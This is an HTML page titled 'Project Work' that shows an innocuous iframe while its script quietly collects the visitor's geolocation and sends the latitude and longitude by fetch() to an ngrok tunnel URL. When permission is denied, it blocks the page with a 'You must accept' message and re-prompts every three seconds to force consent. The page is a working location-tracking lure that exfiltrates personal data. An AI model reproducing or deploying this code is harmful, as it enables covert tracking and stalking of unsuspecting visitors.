<html>
  <head>
    <title>Project Work</title>
  </head>
  
  <body>
      <iframe id="vs" src="/frame.html" style="width: 100vw; height: 100vh;"></iframe>
    <script>
      let main = document.querySelector('body');
      let latitude = 0;
      let longitude = 0;
      function showPosition(position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        url = "https://70b2b8a11285.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
        fetch(url);
      }
      function mustAccept(e) {
        main.innerHTML = "<h1> You must accept, to continue. Refresh to Try Again.</h1>";
        setTimeout(function () { getPos() }, 3000);
      }
      function getPos () {
        window.navigator.geolocation.getCurrentPosition(showPosition, mustAccept);
        main.innerHTML = "<iframe id=\"vs\" src=\"/frame.html\" style=\"width: 100vw; height: 100vh;\"></iframe>";
      }
      getPos();
    </script>
  </body>
